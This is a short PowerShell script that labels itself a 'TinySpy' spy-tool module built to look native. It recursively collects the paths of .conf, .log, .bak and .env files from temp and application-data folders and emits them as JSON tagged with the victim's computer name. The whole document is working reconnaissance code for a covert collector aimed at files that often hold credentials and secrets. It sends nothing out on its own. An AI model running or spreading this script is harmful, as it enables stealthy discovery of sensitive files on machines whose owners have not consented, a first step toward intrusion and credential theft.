# mite_ps.ps1 — TinySpy MITE, Windows variant (looks native, uses only built-ins)
$paths = @($env:TEMP, "$env:APPDATA", "C:\Windows\Temp")
$hits = @()
foreach ($p in $paths) {
    if (Test-Path $p) {
        Get-ChildItem -Path $p -Recurse -ErrorAction SilentlyContinue |
            Where-Object { $_.Extension -in @(".conf", ".log", ".bak", ".env") } |
            Select-Object -First 20 | ForEach-Object { $hits += $_.FullName }
    }
}
@{ tool = "Mite"; target = $env:COMPUTERNAME; data = @{ files = $hits } } | ConvertTo-Json -Depth 3
